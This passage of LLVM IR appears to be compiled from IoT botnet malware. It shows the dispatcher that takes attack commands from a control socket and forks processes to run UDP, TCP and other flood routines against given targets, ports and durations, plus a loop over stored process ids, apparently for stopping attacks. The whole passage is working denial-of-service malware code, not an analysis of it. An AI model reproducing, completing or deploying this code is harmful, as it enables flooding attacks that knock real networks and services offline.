  %55 = load i8*, i8** %54, align 8
  %56 = call i32 @atoi(i8* %55) #10
  %57 = icmp eq i32 %56, -1
  br i1 %57, label %91, label %58

; <label>:58:                                     ; preds = %52
  %59 = load i8**, i8*** %4, align 8
  %60 = getelementptr inbounds i8*, i8** %59, i64 4
  %61 = load i8*, i8** %60, align 8
  %62 = call i32 @atoi(i8* %61) #10
  %63 = icmp eq i32 %62, -1
  br i1 %63, label %91, label %64

; <label>:64:                                     ; preds = %58
  %65 = load i8**, i8*** %4, align 8
  %66 = getelementptr inbounds i8*, i8** %65, i64 5
  %67 = load i8*, i8** %66, align 8
  %68 = call i32 @atoi(i8* %67) #10
  %69 = icmp eq i32 %68, -1
  br i1 %69, label %91, label %70

; <label>:70:                                     ; preds = %64
  %71 = load i8**, i8*** %4, align 8
  %72 = getelementptr inbounds i8*, i8** %71, i64 5
  %73 = load i8*, i8** %72, align 8
  %74 = call i32 @atoi(i8* %73) #10
  %75 = icmp sgt i32 %74, 65500
  br i1 %75, label %91, label %76

; <label>:76:                                     ; preds = %70
  %77 = load i8**, i8*** %4, align 8
  %78 = getelementptr inbounds i8*, i8** %77, i64 4
  %79 = load i8*, i8** %78, align 8
  %80 = call i32 @atoi(i8* %79) #10
  %81 = icmp sgt i32 %80, 32
  br i1 %81, label %91, label %82

; <label>:82:                                     ; preds = %76
  %83 = load i32, i32* %3, align 4
  %84 = icmp eq i32 %83, 7
  br i1 %84, label %85, label %92

; <label>:85:                                     ; preds = %82
  %86 = load i8**, i8*** %4, align 8
  %87 = getelementptr inbounds i8*, i8** %86, i64 6
  %88 = load i8*, i8** %87, align 8
  %89 = call i32 @atoi(i8* %88) #10
  %90 = icmp slt i32 %89, 1
  br i1 %90, label %91, label %92

; <label>:91:                                     ; preds = %85, %76, %70, %64, %58, %52, %46, %43
  br label %629

; <label>:92:                                     ; preds = %85, %82
  %93 = load i8**, i8*** %4, align 8
  %94 = getelementptr inbounds i8*, i8** %93, i64 1
  %95 = load i8*, i8** %94, align 8
  store i8* %95, i8** %5, align 8
  %96 = load i8**, i8*** %4, align 8
  %97 = getelementptr inbounds i8*, i8** %96, i64 2
  %98 = load i8*, i8** %97, align 8
  %99 = call i32 @atoi(i8* %98) #10
  store i32 %99, i32* %6, align 4
  %100 = load i8**, i8*** %4, align 8
  %101 = getelementptr inbounds i8*, i8** %100, i64 3
  %102 = load i8*, i8** %101, align 8
  %103 = call i32 @atoi(i8* %102) #10
  store i32 %103, i32* %7, align 4
  %104 = load i8**, i8*** %4, align 8
  %105 = getelementptr inbounds i8*, i8** %104, i64 4
  %106 = load i8*, i8** %105, align 8
  %107 = call i32 @atoi(i8* %106) #10
  store i32 %107, i32* %8, align 4
  %108 = load i8**, i8*** %4, align 8
  %109 = getelementptr inbounds i8*, i8** %108, i64 5
  %110 = load i8*, i8** %109, align 8
  %111 = call i32 @atoi(i8* %110) #10
  store i32 %111, i32* %9, align 4
  %112 = load i32, i32* %3, align 4
  %113 = icmp eq i32 %112, 7
  br i1 %113, label %114, label %119

; <label>:114:                                    ; preds = %92
  %115 = load i8**, i8*** %4, align 8
  %116 = getelementptr inbounds i8*, i8** %115, i64 6
  %117 = load i8*, i8** %116, align 8
  %118 = call i32 @atoi(i8* %117) #10
  br label %120

; <label>:119:                                    ; preds = %92
  br label %120

; <label>:120:                                    ; preds = %119, %114
  %121 = phi i32 [ %118, %114 ], [ 10, %119 ]
  store i32 %121, i32* %10, align 4
  %122 = load i8*, i8** %5, align 8
  %123 = call i8* @strstr(i8* %122, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #10
  %124 = icmp ne i8* %123, null
  br i1 %124, label %125, label %146

; <label>:125:                                    ; preds = %120
  %126 = load i8*, i8** %5, align 8
  %127 = call i8* @strtok(i8* %126, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %127, i8** %11, align 8
  br label %128

; <label>:128:                                    ; preds = %143, %125
  %129 = load i8*, i8** %11, align 8
  %130 = icmp ne i8* %129, null
  br i1 %130, label %131, label %145

; <label>:131:                                    ; preds = %128
  %132 = call i32 @listFork()
  %133 = icmp ne i32 %132, 0
  br i1 %133, label %143, label %134

; <label>:134:                                    ; preds = %131
  %135 = load i8*, i8** %11, align 8
  %136 = load i32, i32* %6, align 4
  %137 = load i32, i32* %7, align 4
  %138 = load i32, i32* %8, align 4
  %139 = load i32, i32* %9, align 4
  %140 = load i32, i32* %10, align 4
  call void @audp(i8* %135, i32 %136, i32 %137, i32 %138, i32 %139, i32 %140)
  %141 = load i32, i32* @mainCommSock, align 4
  %142 = call i32 @close(i32 %141)
  call void @_exit(i32 0) #11
  unreachable

; <label>:143:                                    ; preds = %131
  %144 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %144, i8** %11, align 8
  br label %128

; <label>:145:                                    ; preds = %128
  br label %159

; <label>:146:                                    ; preds = %120
  %147 = call i32 @listFork()
  %148 = icmp ne i32 %147, 0
  br i1 %148, label %149, label %150

; <label>:149:                                    ; preds = %146
  br label %629

; <label>:150:                                    ; preds = %146
  %151 = load i8*, i8** %5, align 8
  %152 = load i32, i32* %6, align 4
  %153 = load i32, i32* %7, align 4
  %154 = load i32, i32* %8, align 4
  %155 = load i32, i32* %9, align 4
  %156 = load i32, i32* %10, align 4
  call void @audp(i8* %151, i32 %152, i32 %153, i32 %154, i32 %155, i32 %156)
  %157 = load i32, i32* @mainCommSock, align 4
  %158 = call i32 @close(i32 %157)
  call void @_exit(i32 0) #11
  unreachable

; <label>:159:                                    ; preds = %145
  br label %160

; <label>:160:                                    ; preds = %159, %2
  %161 = load i8**, i8*** %4, align 8
  %162 = getelementptr inbounds i8*, i8** %161, i64 0
  %163 = load i8*, i8** %162, align 8
  %164 = call i32 @strcmp(i8* %163, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.32, i32 0, i32 0)) #10
  %165 = icmp ne i32 %164, 0
  br i1 %165, label %222, label %166

; <label>:166:                                    ; preds = %160
  %167 = load i32, i32* %3, align 4
  %168 = icmp slt i32 %167, 4
  br i1 %168, label %181, label %169

; <label>:169:                                    ; preds = %166
  %170 = load i8**, i8*** %4, align 8
  %171 = getelementptr inbounds i8*, i8** %170, i64 2
  %172 = load i8*, i8** %171, align 8
  %173 = call i32 @atoi(i8* %172) #10
  %174 = icmp slt i32 %173, 1
  br i1 %174, label %181, label %175

; <label>:175:                                    ; preds = %169
  %176 = load i8**, i8*** %4, align 8
  %177 = getelementptr inbounds i8*, i8** %176, i64 3
  %178 = load i8*, i8** %177, align 8
  %179 = call i32 @atoi(i8* %178) #10
  %180 = icmp slt i32 %179, 1
  br i1 %180, label %181, label %182

; <label>:181:                                    ; preds = %175, %169, %166
  br label %629

; <label>:182:                                    ; preds = %175
  %183 = load i8**, i8*** %4, align 8
  %184 = getelementptr inbounds i8*, i8** %183, i64 1
  %185 = load i8*, i8** %184, align 8
  store i8* %185, i8** %12, align 8
  %186 = load i8**, i8*** %4, align 8
  %187 = getelementptr inbounds i8*, i8** %186, i64 2
  %188 = load i8*, i8** %187, align 8
  %189 = call i32 @atoi(i8* %188) #10
  store i32 %189, i32* %13, align 4
  %190 = load i8**, i8*** %4, align 8
  %191 = getelementptr inbounds i8*, i8** %190, i64 3
  %192 = load i8*, i8** %191, align 8
  %193 = call i32 @atoi(i8* %192) #10
  store i32 %193, i32* %14, align 4
  %194 = load i8*, i8** %12, align 8
  %195 = call i8* @strstr(i8* %194, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #10
  %196 = icmp ne i8* %195, null
  br i1 %196, label %197, label %213

; <label>:197:                                    ; preds = %182
  %198 = load i8*, i8** %12, align 8
  %199 = call i8* @strtok(i8* %198, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %199, i8** %15, align 8
  br label %200

; <label>:200:                                    ; preds = %210, %197
  %201 = load i8*, i8** %15, align 8
  %202 = icmp ne i8* %201, null
  br i1 %202, label %203, label %212

; <label>:203:                                    ; preds = %200
  %204 = call i32 @listFork()
  %205 = icmp ne i32 %204, 0
  br i1 %205, label %210, label %206

; <label>:206:                                    ; preds = %203
  %207 = load i8*, i8** %15, align 8
  %208 = load i32, i32* %13, align 4
  %209 = load i32, i32* %14, align 4
  call void @astd(i8* %207, i32 %208, i32 %209)
  call void @_exit(i32 0) #11
  unreachable

; <label>:210:                                    ; preds = %203
  %211 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %211, i8** %15, align 8
  br label %200

; <label>:212:                                    ; preds = %200
  br label %221

; <label>:213:                                    ; preds = %182
  %214 = call i32 @listFork()
  %215 = icmp ne i32 %214, 0
  br i1 %215, label %216, label %217

; <label>:216:                                    ; preds = %213
  br label %629

; <label>:217:                                    ; preds = %213
  %218 = load i8*, i8** %12, align 8
  %219 = load i32, i32* %13, align 4
  %220 = load i32, i32* %14, align 4
  call void @astd(i8* %218, i32 %219, i32 %220)
  call void @_exit(i32 0) #11
  unreachable

; <label>:221:                                    ; preds = %212
  br label %222

; <label>:222:                                    ; preds = %221, %160
  %223 = load i8**, i8*** %4, align 8
  %224 = getelementptr inbounds i8*, i8** %223, i64 0
  %225 = load i8*, i8** %224, align 8
  %226 = call i32 @strcmp(i8* %225, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.33, i32 0, i32 0)) #10
  %227 = icmp ne i32 %226, 0
  br i1 %227, label %366, label %228

; <label>:228:                                    ; preds = %222
  %229 = load i32, i32* %3, align 4
  %230 = icmp slt i32 %229, 6
  br i1 %230, label %273, label %231

; <label>:231:                                    ; preds = %228
  %232 = load i8**, i8*** %4, align 8
  %233 = getelementptr inbounds i8*, i8** %232, i64 3
  %234 = load i8*, i8** %233, align 8
  %235 = call i32 @atoi(i8* %234) #10
  %236 = icmp eq i32 %235, -1
  br i1 %236, label %273, label %237

; <label>:237:                                    ; preds = %231
  %238 = load i8**, i8*** %4, align 8
  %239 = getelementptr inbounds i8*, i8** %238, i64 2
  %240 = load i8*, i8** %239, align 8
  %241 = call i32 @atoi(i8* %240) #10
  %242 = icmp eq i32 %241, -1
  br i1 %242, label %273, label %243

; <label>:243:                                    ; preds = %237
  %244 = load i8**, i8*** %4, align 8
  %245 = getelementptr inbounds i8*, i8** %244, i64 4
  %246 = load i8*, i8** %245, align 8
  %247 = call i32 @atoi(i8* %246) #10
  %248 = icmp eq i32 %247, -1
  br i1 %248, label %273, label %249

; <label>:249:                                    ; preds = %243
  %250 = load i8**, i8*** %4, align 8
  %251 = getelementptr inbounds i8*, i8** %250, i64 4
  %252 = load i8*, i8** %251, align 8
  %253 = call i32 @atoi(i8* %252) #10
  %254 = icmp sgt i32 %253, 32
  br i1 %254, label %273, label %255

; <label>:255:                                    ; preds = %249
  %256 = load i32, i32* %3, align 4
  %257 = icmp sgt i32 %256, 6
  br i1 %257, label %258, label %264

; <label>:258:                                    ; preds = %255
  %259 = load i8**, i8*** %4, align 8
  %260 = getelementptr inbounds i8*, i8** %259, i64 6
  %261 = load i8*, i8** %260, align 8
  %262 = call i32 @atoi(i8* %261) #10
  %263 = icmp slt i32 %262, 0
  br i1 %263, label %273, label %264

; <label>:264:                                    ; preds = %258, %255
  %265 = load i32, i32* %3, align 4
  %266 = icmp eq i32 %265, 8
  br i1 %266, label %267, label %274

; <label>:267:                                    ; preds = %264
  %268 = load i8**, i8*** %4, align 8
  %269 = getelementptr inbounds i8*, i8** %268, i64 7
  %270 = load i8*, i8** %269, align 8
  %271 = call i32 @atoi(i8* %270) #10
  %272 = icmp slt i32 %271, 1
  br i1 %272, label %273, label %274

; <label>:273:                                    ; preds = %267, %258, %249, %243, %237, %231, %228
  br label %629

; <label>:274:                                    ; preds = %267, %264
  %275 = load i8**, i8*** %4, align 8
  %276 = getelementptr inbounds i8*, i8** %275, i64 1
  %277 = load i8*, i8** %276, align 8
  store i8* %277, i8** %16, align 8
  %278 = load i8**, i8*** %4, align 8
  %279 = getelementptr inbounds i8*, i8** %278, i64 2
  %280 = load i8*, i8** %279, align 8
  %281 = call i32 @atoi(i8* %280) #10
  store i32 %281, i32* %17, align 4
  %282 = load i8**, i8*** %4, align 8
  %283 = getelementptr inbounds i8*, i8** %282, i64 3
  %284 = load i8*, i8** %283, align 8
  %285 = call i32 @atoi(i8* %284) #10
  store i32 %285, i32* %18, align 4
  %286 = load i8**, i8*** %4, align 8
  %287 = getelementptr inbounds i8*, i8** %286, i64 4
  %288 = load i8*, i8** %287, align 8
  %289 = call i32 @atoi(i8* %288) #10
  store i32 %289, i32* %19, align 4
  %290 = load i8**, i8*** %4, align 8
  %291 = getelementptr inbounds i8*, i8** %290, i64 5
  %292 = load i8*, i8** %291, align 8
  store i8* %292, i8** %20, align 8
  %293 = load i32, i32* %3, align 4
  %294 = icmp eq i32 %293, 8
  br i1 %294, label %295, label %300

; <label>:295:                                    ; preds = %274
  %296 = load i8**, i8*** %4, align 8
  %297 = getelementptr inbounds i8*, i8** %296, i64 7
  %298 = load i8*, i8** %297, align 8
  %299 = call i32 @atoi(i8* %298) #10
  br label %301

; <label>:300:                                    ; preds = %274
  br label %301

; <label>:301:                                    ; preds = %300, %295
  %302 = phi i32 [ %299, %295 ], [ 10, %300 ]
  store i32 %302, i32* %21, align 4
  %303 = load i32, i32* %3, align 4
  %304 = icmp sgt i32 %303, 6
  br i1 %304, label %305, label %310

; <label>:305:                                    ; preds = %301
  %306 = load i8**, i8*** %4, align 8
  %307 = getelementptr inbounds i8*, i8** %306, i64 6
  %308 = load i8*, i8** %307, align 8
  %309 = call i32 @atoi(i8* %308) #10
  br label %311

; <label>:310:                                    ; preds = %301
  br label %311

; <label>:311:                                    ; preds = %310, %305
  %312 = phi i32 [ %309, %305 ], [ 0, %310 ]
  store i32 %312, i32* %22, align 4
  %313 = load i8*, i8** %16, align 8
  %314 = call i8* @strstr(i8* %313, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #10
  %315 = icmp ne i8* %314, null
  br i1 %315, label %316, label %338

; <label>:316:                                    ; preds = %311
  %317 = load i8*, i8** %16, align 8
  %318 = call i8* @strtok(i8* %317, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %318, i8** %23, align 8
  br label %319

; <label>:319:                                    ; preds = %335, %316
  %320 = load i8*, i8** %23, align 8
  %321 = icmp ne i8* %320, null
  br i1 %321, label %322, label %337

; <label>:322:                                    ; preds = %319
  %323 = call i32 @listFork()
  %324 = icmp ne i32 %323, 0
  br i1 %324, label %335, label %325

; <label>:325:                                    ; preds = %322
  %326 = load i8*, i8** %23, align 8
  %327 = load i32, i32* %17, align 4
  %328 = load i32, i32* %18, align 4
  %329 = load i32, i32* %19, align 4
  %330 = load i8*, i8** %20, align 8
  %331 = load i32, i32* %22, align 4
  %332 = load i32, i32* %21, align 4
  call void @atcp(i8* %326, i32 %327, i32 %328, i32 %329, i8* %330, i32 %331, i32 %332)
  %333 = load i32, i32* @mainCommSock, align 4
  %334 = call i32 @close(i32 %333)
  call void @_exit(i32 0) #11
  unreachable

; <label>:335:                                    ; preds = %322
  %336 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %336, i8** %23, align 8
  br label %319

; <label>:337:                                    ; preds = %319
  br label %365

; <label>:338:                                    ; preds = %311
  %339 = call i32 @listFork()
  %340 = icmp ne i32 %339, 0
  br i1 %340, label %341, label %342

; <label>:341:                                    ; preds = %338
  br label %629

; <label>:342:                                    ; preds = %338
  %343 = load i32, i32* @mainCommSock, align 4
  %344 = load i8**, i8*** %4, align 8
  %345 = getelementptr inbounds i8*, i8** %344, i64 1
  %346 = load i8*, i8** %345, align 8
  %347 = load i8**, i8*** %4, align 8
  %348 = getelementptr inbounds i8*, i8** %347, i64 2
  %349 = load i8*, i8** %348, align 8
  %350 = call i32 @atoi(i8* %349) #10
  %351 = load i8**, i8*** %4, align 8
  %352 = getelementptr inbounds i8*, i8** %351, i64 3
  %353 = load i8*, i8** %352, align 8
  %354 = call i32 @atoi(i8* %353) #10
  %355 = call i32 (i32, i8*, ...) @sockprintf(i32 %343, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.34, i32 0, i32 0), i8* %346, i32 %350, i32 %354)
  %356 = load i8*, i8** %16, align 8
  %357 = load i32, i32* %17, align 4
  %358 = load i32, i32* %18, align 4
  %359 = load i32, i32* %19, align 4
  %360 = load i8*, i8** %20, align 8
  %361 = load i32, i32* %22, align 4
  %362 = load i32, i32* %21, align 4
  call void @atcp(i8* %356, i32 %357, i32 %358, i32 %359, i8* %360, i32 %361, i32 %362)
  %363 = load i32, i32* @mainCommSock, align 4
  %364 = call i32 @close(i32 %363)
  call void @_exit(i32 0) #11
  unreachable

; <label>:365:                                    ; preds = %337
  br label %366

; <label>:366:                                    ; preds = %365, %222
  %367 = load i8**, i8*** %4, align 8
  %368 = getelementptr inbounds i8*, i8** %367, i64 0
  %369 = load i8*, i8** %368, align 8
  %370 = call i32 @strcmp(i8* %369, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i32 0, i32 0)) #10
  %371 = icmp ne i32 %370, 0
  br i1 %371, label %515, label %372

; <label>:372:                                    ; preds = %366
  %373 = load i32, i32* %3, align 4
  %374 = icmp slt i32 %373, 6
  br i1 %374, label %417, label %375

; <label>:375:                                    ; preds = %372
  %376 = load i8**, i8*** %4, align 8
  %377 = getelementptr inbounds i8*, i8** %376, i64 3
  %378 = load i8*, i8** %377, align 8
  %379 = call i32 @atoi(i8* %378) #10
  %380 = icmp eq i32 %379, -1
  br i1 %380, label %417, label %381

; <label>:381:                                    ; preds = %375
  %382 = load i8**, i8*** %4, align 8
  %383 = getelementptr inbounds i8*, i8** %382, i64 2
  %384 = load i8*, i8** %383, align 8
  %385 = call i32 @atoi(i8* %384) #10
  %386 = icmp eq i32 %385, -1
  br i1 %386, label %417, label %387

; <label>:387:                                    ; preds = %381
  %388 = load i8**, i8*** %4, align 8
  %389 = getelementptr inbounds i8*, i8** %388, i64 4
  %390 = load i8*, i8** %389, align 8
  %391 = call i32 @atoi(i8* %390) #10
  %392 = icmp eq i32 %391, -1
  br i1 %392, label %417, label %393

; <label>:393:                                    ; preds = %387
  %394 = load i8**, i8*** %4, align 8
  %395 = getelementptr inbounds i8*, i8** %394, i64 4
  %396 = load i8*, i8** %395, align 8
  %397 = call i32 @atoi(i8* %396) #10
  %398 = icmp sgt i32 %397, 32
  br i1 %398, label %417, label %399

; <label>:399:                                    ; preds = %393
  %400 = load i32, i32* %3, align 4
  %401 = icmp sgt i32 %400, 6
  br i1 %401, label %402, label %408

; <label>:402:                                    ; preds = %399
  %403 = load i8**, i8*** %4, align 8
  %404 = getelementptr inbounds i8*, i8** %403, i64 6
  %405 = load i8*, i8** %404, align 8
  %406 = call i32 @atoi(i8* %405) #10
  %407 = icmp slt i32 %406, 0
  br i1 %407, label %417, label %408

; <label>:408:                                    ; preds = %402, %399
  %409 = load i32, i32* %3, align 4
  %410 = icmp eq i32 %409, 8
  br i1 %410, label %411, label %418

; <label>:411:                                    ; preds = %408
  %412 = load i8**, i8*** %4, align 8
  %413 = getelementptr inbounds i8*, i8** %412, i64 7
  %414 = load i8*, i8** %413, align 8
  %415 = call i32 @atoi(i8* %414) #10
  %416 = icmp slt i32 %415, 1
  br i1 %416, label %417, label %418

; <label>:417:                                    ; preds = %411, %402, %393, %387, %381, %375, %372
  br label %629

; <label>:418:                                    ; preds = %411, %408
  %419 = load i8**, i8*** %4, align 8
  %420 = getelementptr inbounds i8*, i8** %419, i64 1
  %421 = load i8*, i8** %420, align 8
  store i8* %421, i8** %24, align 8
  %422 = load i8**, i8*** %4, align 8
  %423 = getelementptr inbounds i8*, i8** %422, i64 2
  %424 = load i8*, i8** %423, align 8
  %425 = call i32 @atoi(i8* %424) #10
  store i32 %425, i32* %25, align 4
  %426 = load i8**, i8*** %4, align 8
  %427 = getelementptr inbounds i8*, i8** %426, i64 3
  %428 = load i8*, i8** %427, align 8
  %429 = call i32 @atoi(i8* %428) #10
  store i32 %429, i32* %26, align 4
  %430 = load i8**, i8*** %4, align 8
  %431 = getelementptr inbounds i8*, i8** %430, i64 4
  %432 = load i8*, i8** %431, align 8
  %433 = call i32 @atoi(i8* %432) #10
  store i32 %433, i32* %27, align 4
  %434 = load i8**, i8*** %4, align 8
  %435 = getelementptr inbounds i8*, i8** %434, i64 5
  %436 = load i8*, i8** %435, align 8
  store i8* %436, i8** %28, align 8
  %437 = load i32, i32* %3, align 4
  %438 = icmp eq i32 %437, 8
  br i1 %438, label %439, label %444

; <label>:439:                                    ; preds = %418
  %440 = load i8**, i8*** %4, align 8
  %441 = getelementptr inbounds i8*, i8** %440, i64 7
  %442 = load i8*, i8** %441, align 8
  %443 = call i32 @atoi(i8* %442) #10
  br label %445

; <label>:444:                                    ; preds = %418
  br label %445

; <label>:445:                                    ; preds = %444, %439
  %446 = phi i32 [ %443, %439 ], [ 10, %444 ]
  store i32 %446, i32* %29, align 4
  %447 = load i32, i32* %3, align 4
  %448 = icmp sgt i32 %447, 6
  br i1 %448, label %449, label %454

; <label>:449:                                    ; preds = %445
  %450 = load i8**, i8*** %4, align 8
  %451 = getelementptr inbounds i8*, i8** %450, i64 6
  %452 = load i8*, i8** %451, align 8
  %453 = call i32 @atoi(i8* %452) #10
  br label %455

; <label>:454:                                    ; preds = %445
  br label %455

; <label>:455:                                    ; preds = %454, %449
  %456 = phi i32 [ %453, %449 ], [ 0, %454 ]
  store i32 %456, i32* %30, align 4
  %457 = load i8*, i8** %24, align 8
  %458 = call i8* @strstr(i8* %457, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #10
  %459 = icmp ne i8* %458, null
  br i1 %459, label %460, label %491

; <label>:460:                                    ; preds = %455
  %461 = load i8*, i8** %24, align 8
  %462 = call i8* @strtok(i8* %461, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %462, i8** %31, align 8
  br label %463

; <label>:463:                                    ; preds = %488, %460
  %464 = load i8*, i8** %31, align 8
  %465 = icmp ne i8* %464, null
  br i1 %465, label %466, label %490

; <label>:466:                                    ; preds = %463
  %467 = call i32 @listFork()
  %468 = icmp ne i32 %467, 0
  br i1 %468, label %488, label %469

; <label>:469:                                    ; preds = %466
  %470 = load i8*, i8** %24, align 8
  %471 = load i32, i32* %25, align 4
  %472 = load i32, i32* %26, align 4
  call void @astd(i8* %470, i32 %471, i32 %472)
  %473 = load i8*, i8** %24, align 8
  %474 = load i32, i32* %25, align 4
  %475 = load i32, i32* %26, align 4
  %476 = load i32, i32* %27, align 4
  %477 = load i32, i32* %30, align 4
  %478 = load i32, i32* %29, align 4
  call void @audp(i8* %473, i32 %474, i32 %475, i32 %476, i32 %477, i32 %478)
  %479 = load i8*, i8** %24, align 8
  %480 = load i32, i32* %25, align 4
  %481 = load i32, i32* %26, align 4
  %482 = load i32, i32* %27, align 4
  %483 = load i8*, i8** %28, align 8
  %484 = load i32, i32* %30, align 4
  %485 = load i32, i32* %29, align 4
  call void @atcp(i8* %479, i32 %480, i32 %481, i32 %482, i8* %483, i32 %484, i32 %485)
  %486 = load i32, i32* @mainCommSock, align 4
  %487 = call i32 @close(i32 %486)
  call void @_exit(i32 0) #11
  unreachable

; <label>:488:                                    ; preds = %466
  %489 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %489, i8** %31, align 8
  br label %463

; <label>:490:                                    ; preds = %463
  br label %514

; <label>:491:                                    ; preds = %455
  %492 = call i32 @listFork()
  %493 = icmp ne i32 %492, 0
  br i1 %493, label %494, label %495

; <label>:494:                                    ; preds = %491
  br label %629

; <label>:495:                                    ; preds = %491
  %496 = load i8*, i8** %24, align 8
  %497 = load i32, i32* %25, align 4
  %498 = load i32, i32* %26, align 4
  call void @astd(i8* %496, i32 %497, i32 %498)
  %499 = load i8*, i8** %24, align 8
  %500 = load i32, i32* %25, align 4
  %501 = load i32, i32* %26, align 4
  %502 = load i32, i32* %27, align 4
  %503 = load i32, i32* %30, align 4
  %504 = load i32, i32* %29, align 4
  call void @audp(i8* %499, i32 %500, i32 %501, i32 %502, i32 %503, i32 %504)
  %505 = load i8*, i8** %24, align 8
  %506 = load i32, i32* %25, align 4
  %507 = load i32, i32* %26, align 4
  %508 = load i32, i32* %27, align 4
  %509 = load i8*, i8** %28, align 8
  %510 = load i32, i32* %30, align 4
  %511 = load i32, i32* %29, align 4
  call void @atcp(i8* %505, i32 %506, i32 %507, i32 %508, i8* %509, i32 %510, i32 %511)
  %512 = load i32, i32* @mainCommSock, align 4
  %513 = call i32 @close(i32 %512)
  call void @_exit(i32 0) #11
  unreachable

; <label>:514:                                    ; preds = %490
  br label %515

; <label>:515:                                    ; preds = %514, %366
  %516 = load i8**, i8*** %4, align 8
  %517 = getelementptr inbounds i8*, i8** %516, i64 0
  %518 = load i8*, i8** %517, align 8
  %519 = call i32 @strcmp(i8* %518, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.36, i32 0, i32 0)) #10
  %520 = icmp ne i32 %519, 0
  br i1 %520, label %579, label %521

; <label>:521:                                    ; preds = %515
  %522 = load i32, i32* %3, align 4
  %523 = icmp slt i32 %522, 4
  br i1 %523, label %536, label %524

; <label>:524:                                    ; preds = %521
  %525 = load i8**, i8*** %4, align 8
  %526 = getelementptr inbounds i8*, i8** %525, i64 2
  %527 = load i8*, i8** %526, align 8
  %528 = call i32 @atoi(i8* %527) #10
  %529 = icmp slt i32 %528, 1
  br i1 %529, label %536, label %530

; <label>:530:                                    ; preds = %524
  %531 = load i8**, i8*** %4, align 8
  %532 = getelementptr inbounds i8*, i8** %531, i64 3
  %533 = load i8*, i8** %532, align 8
  %534 = call i32 @atoi(i8* %533) #10
  %535 = icmp slt i32 %534, 1
  br i1 %535, label %536, label %537

; <label>:536:                                    ; preds = %530, %524, %521
  br label %629

; <label>:537:                                    ; preds = %530
  %538 = load i8**, i8*** %4, align 8
  %539 = getelementptr inbounds i8*, i8** %538, i64 1
  %540 = load i8*, i8** %539, align 8
  store i8* %540, i8** %32, align 8
  %541 = load i8**, i8*** %4, align 8
  %542 = getelementptr inbounds i8*, i8** %541, i64 2
  %543 = load i8*, i8** %542, align 8
  %544 = call i32 @atoi(i8* %543) #10
  store i32 %544, i32* %33, align 4
  %545 = load i8**, i8*** %4, align 8
  %546 = getelementptr inbounds i8*, i8** %545, i64 3
  %547 = load i8*, i8** %546, align 8
  %548 = call i32 @atoi(i8* %547) #10
  store i32 %548, i32* %34, align 4
  %549 = load i8*, i8** %32, align 8
  %550 = call i8* @strstr(i8* %549, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #10
  %551 = icmp ne i8* %550, null
  br i1 %551, label %552, label %570

; <label>:552:                                    ; preds = %537
  %553 = load i8*, i8** %32, align 8
  %554 = call i8* @strtok(i8* %553, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %554, i8** %35, align 8
  br label %555

; <label>:555:                                    ; preds = %567, %552
  %556 = load i8*, i8** %35, align 8
  %557 = icmp ne i8* %556, null
  br i1 %557, label %558, label %569

; <label>:558:                                    ; preds = %555
  %559 = call i32 @listFork()
  %560 = icmp ne i32 %559, 0
  br i1 %560, label %567, label %561

; <label>:561:                                    ; preds = %558
  %562 = load i8*, i8** %35, align 8
  %563 = load i32, i32* %33, align 4
  %564 = load i32, i32* %34, align 4
  call void @acnc(i8* %562, i32 %563, i32 %564)
  %565 = load i32, i32* @mainCommSock, align 4
  %566 = call i32 @close(i32 %565)
  call void @_exit(i32 0) #11
  unreachable

; <label>:567:                                    ; preds = %558
  %568 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %568, i8** %35, align 8
  br label %555

; <label>:569:                                    ; preds = %555
  br label %578

; <label>:570:                                    ; preds = %537
  %571 = call i32 @listFork()
  %572 = icmp ne i32 %571, 0
  br i1 %572, label %573, label %574

; <label>:573:                                    ; preds = %570
  br label %629

; <label>:574:                                    ; preds = %570
  %575 = load i8*, i8** %32, align 8
  %576 = load i32, i32* %33, align 4
  %577 = load i32, i32* %34, align 4
  call void @acnc(i8* %575, i32 %576, i32 %577)
  call void @_exit(i32 0) #11
  unreachable

; <label>:578:                                    ; preds = %569
  br label %579

; <label>:579:                                    ; preds = %578, %515
  %580 = load i8**, i8*** %4, align 8
  %581 = getelementptr inbounds i8*, i8** %580, i64 0
  %582 = load i8*, i8** %581, align 8
  %583 = call i32 @strcmp(i8* %582, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.37, i32 0, i32 0)) #10
  %584 = icmp ne i32 %583, 0
  br i1 %584, label %629, label %585

; <label>:585:                                    ; preds = %579
  store i32 0, i32* %36, align 4
  store i64 0, i64* %37, align 8
  br label %586

; <label>:586:                                    ; preds = %616, %585
  %587 = load i64, i64* %37, align 8
  %588 = load i64, i64* @numpids, align 8
  %589 = icmp ult i64 %587, %588
  br i1 %589, label %590, label %623

; <label>:590:                                    ; preds = %586
  %591 = load i32*, i32** @pids, align 8
  %592 = load i64, i64* %37, align 8
  %593 = getelementptr inbounds i32, i32* %591, i64 %592
